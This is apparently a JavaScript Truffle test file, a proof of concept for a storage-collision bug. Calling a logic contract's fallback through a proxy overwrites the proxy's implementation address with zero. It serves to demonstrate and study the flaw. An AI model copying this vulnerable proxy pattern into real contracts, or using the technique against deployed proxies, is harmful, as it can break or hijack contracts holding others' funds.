const ProxyContract = artifacts.require('Proxy');
const LogicContract = artifacts.require('Logic');
const { expect } = require('chai');
const { constants } = require('openzeppelin-test-helpers');


contract('Storage collision exploit PoC', () => {
    
    beforeEach(async function () {
        // Deploy logic contract (holds exploiting function)
        this.logic = await LogicContract.new();

        // Deploy the proxy, setting the logic contract address
        this.proxy = await ProxyContract.new(this.logic.address);

        // Calls to the logic contract will be made through the proxy
        // Such as: [--> instance -> proxy --> logic]
        this.instance = await LogicContract.at(this.proxy.address);
    });

    it('overwrites proxy\'s storage', async function () {
        // Read storage before exploit
        const oldImplementationAddr = await this.proxy.implementation();
        expect(oldImplementationAddr).to.be.equal(this.logic.address);
        
        // Execute fallback function
        await this.instance.sendTransaction();

        // Read storage after exploit
        const newImplementationAddr = await this.proxy.implementation();

        // Check that state variable in logic contract was never written
        expect(await this.logic.someAddress()).to.be.equal('0x0000000000000000000000000000000000000123');

        // Check that state variable in proxy is overwritten and set to null
        expect(newImplementationAddr).to.be.equal(constants.ZERO_ADDRESS);
    });
});
